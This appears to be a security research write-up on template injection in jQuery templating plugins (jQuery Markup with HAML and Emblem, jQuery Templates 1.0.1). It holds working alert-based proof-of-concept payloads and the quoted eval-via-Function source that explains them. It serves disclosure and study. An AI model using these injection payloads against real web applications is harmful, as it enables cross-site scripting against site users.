# Introduction #

jQuery might be one of the most well-known JavaScript libraries out there. According to [BuiltWith](http://trends.builtwith.com/javascript/jQuery), more than half of the Quantcast Top 1 Million websites use it - and 20% of the entire Internet does so too. That's a lot.

While jQuery on its own doesn't support MVC or templating, a bunch of jQuery plugins do. And, to our very surprise, most of them are quite secure! Most of them. let's have a look at those who aren't.

# Quick Facts #

We analysed half a dozen of jQuery Template plugins (Tempura, jQuery Mustache, jsRazor, jQuery Templating and what not). Two found their way here. One because it's fascinating and powerful and should be shown off to make people shiver. One because it's actually quite vulnerable.

## jQuery Markup ##

[jQuery Markup](https://github.com/rse/jquery-markup) is a very interesting project as it allows to define templates inside custom tags - the `<markup>` elements. The content of the `<markup>` elements can be of many different types. jQuery Markup supports a large bunch of templating languages - among them even exotic birds like HAML or Emblem.

The plugin is not particularly unsafe - note that it insists on separating the templates from the actual page. It is a great and easy way to play with exotic template languages though. That's why we listed it here.

### HAML ###

"Haml (HTML Abstraction Markup Language) is a lightweight markup language that is used to describe the XHTML of any web document without the use of traditional inline coding."

From https://en.wikipedia.org/wiki/Haml

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.0/jquery.min.js" type="text/javascript"></script>
<script src="https://rawgithub.com/rse/jquery-markup/master/jquery.markup.js" type="text/javascript"></script>
<script src="https://rawgithub.com/creationix/haml-js/master/lib/haml.js" type="text/javascript"></script>

<script>
    $(document).ready(function () {
        $.markup.load(function () {
            var h = $("body").markup("hello");
        });
    });            
</script>
<link href="test2.html" rel="markup" type="text/x-markup-haml"/>
```

```
<markup id="hello">
!!! XML
!!! strict
%svg{ onload: "alert(1)" }
</markup>
```

### Emblem ###

Emblem even works easily without jQuery markup so we stripped down the PoC a bit. If you ever run into a web application using Emblem and manage to get injected content into a template container... well see for yourself.

```
<meta charset="utf8">
<script type='text/javascript' src='http://code.jquery.com/jquery-1.8.3.js'></script>
<script type='text/javascript' src="https://s3.amazonaws.com/machty/emblem.min.js"></script>
<script type='text/javascript' src="https://s3.amazonaws.com/machty/ember.js"></script>
<script type='text/javascript'>//<![CDATA[ 
$(window).load(function(){
    Ember.Application.create();
});//]]>  
</script>
<body>
<script type="text/x-emblem">
  script alert(1)
</script>
```

Emblem at least make sure, that only code inside `SCRIPT` elements is being parsed as template container - which is a good thing. As we can see below.

## jQuery Templates Plugin 1.0.1 ##

Unlike other, quite securely designed jQuery templating plugins, this one really messed it up. Is the content of a template tag close to be an `eval`? Yes. Do we have any sort of sandbox or at least attempts to limit the scope of the embedded JavaScript? No. Does it accept arbitrary elements as template containers? Yes. Shown below are some examples for successful injections inside a template container - and further below we have the reason for it - straight `eval` via string concatenation crowned by a call to `Function`.

### Injection Attacks ###

```
<script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.1.min.js"></script>
<script src="https://rawgithub.com/KanbanSolutions/jquery-tmpl/master/jquery.tmpl.js"></script>
<script type="text/javascript">
jQuery(function(){
	$("#x").tmpl([{}])
});
</script>
<div id="x">
	${constructor.constructor('alert(1)')()}
	${alert.bind(window)(2)}
	${location='javascript\x3Aalert%283%29'}
	{%= (1,eval)('this').alert(4) %}
</div>
```

### Eval via Function ###

The current jQuery Template Plugin features two ways to parse and execute template code - one for the `${}` syntax and one for the mustache-like syntax. For us this doesn't really matter - what matters is that what ever happens inside the template delimiters is being pumped straight into a Function call - along with a heavily concatenated string containing the "parsed" results.

Only one thing separated the template delimiters from being a perfect eval sink: the `call()` syntax the developers used to mess a bit with the execution scope. As seen above, we don't really care and execute arbitrary JavaScript as we please.

Note that the template element can be any kind of element - as long as it matches the ID given in the JavaScript calling the template method. In our example we used a `DIV` - and not a `SCRIPT` with type `text/x-jquery-tmpl`.

```
    // Generate a reusable function that will serve to render a template against data
    function buildTmplFn(markup) {
        var parse_tag = function(all, slash, type, fnargs, target, parens, args) {
            if(!type) {
                return "');__.push('";
            }

            var tag = $.tmpl.tag[ type ], def, expr, exprAutoFnDetect;
            if(!tag) {
                console.group("Exception");
                console.error(markup);
                console.error('Unknown tag: ', type);
                console.error(all);
                console.groupEnd("Exception");
                return "');__.push('";
            }
            def = tag._default || [];
            if(parens && !regex.last_word.test(target)) {
                target += parens;
                parens = "";
            }
            if(target) {
                target = unescape(target);
                args = args ? ("," + unescape(args) + ")") : (parens ? ")" : "");
                // Support for target being things like a.toLowerCase();
                // In that case don't call with template item as 'this' pointer. Just evaluate...
                expr = parens ? (target.indexOf(".") > -1 ? target + unescape(parens) : ("(" + target + ").call($item" + args)) : target;
                exprAutoFnDetect = parens ? expr : "(typeof(" + target + ")==='function'?(" + target + ").call($item):(" + target + "))";
            } else {
                exprAutoFnDetect = expr = def.$1 || "null";
            }
            fnargs = unescape(fnargs);
            return "');" +
                   tag[ slash ? "close" : "open" ]
                           .split("$notnull_1").join(target ? "typeof(" + target + ")!=='undefined' && (" + target + ")!=null" : "true")
                           .split("$1a").join(exprAutoFnDetect)
                           .split("$1").join(expr)
                           .split("$2").join(fnargs || def.$2 || "") +
                   "__.push('";
        };

        var depreciated_parse = function() {
            if($.tmpl.tag[arguments[2]]) {
                console.group("Depreciated");
                console.info(markup);
                console.info('Markup has old style indicators, use {% %} instead of {{ }}');
                console.info(arguments[0]);
                console.groupEnd("Depreciated");
                return parse_tag.apply(this, arguments);
            } else {
                return "');__.push('{{" + arguments[2] + "}}');__.push('";
            }
        };

        // Use the variable __ to hold a string array while building the compiled template. (See https://github.com/jquery/jquery-tmpl/issues#issue/10).
        // Introduce the data as local variables using with(){}
        var parsed_markup_data = "var $=$,call,__=[],$data=$item.data; with($data){__.push('";

        // Convert the template into pure JavaScript
        var parsed_markup = $.trim(markup);
        parsed_markup = parsed_markup.replace(regex.sq_escape, "\\$1");
        parsed_markup = parsed_markup.replace(regex.nl_strip, " ");
        parsed_markup = parsed_markup.replace(regex.shortcut_replace, "{%= $1%}");
        parsed_markup = parsed_markup.replace(regex.lang_parse,  parse_tag);
        parsed_markup = parsed_markup.replace(regex.old_lang_parse, depreciated_parse);
        parsed_markup_data += parsed_markup;

        parsed_markup_data += "');}return __;";

        return new Function("$", "$item", parsed_markup_data);
    }
```